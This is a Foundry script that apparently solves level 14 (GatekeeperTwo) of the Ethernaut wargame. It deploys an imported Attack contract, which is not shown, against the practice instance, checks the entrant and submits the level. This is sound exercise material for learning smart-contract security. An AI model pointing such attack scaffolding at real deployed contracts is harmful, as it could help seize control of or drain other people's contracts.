// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {GatekeeperTwo} from "../src/Level14.sol";
import {Attack} from "../src/Level14Attack.sol";

contract Level14 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        GatekeeperTwo instance = GatekeeperTwo(vm.envAddress("LVL14_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack(instance);

        address first = instance.entrant();
        console2.log("first: ", first);

        address second = instance.entrant();
        console2.log("second: ", second);
        if (second == me) {
            console2.log("Level14: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("Level14: Failed");
        }

        vm.stopBroadcast();
    }
}
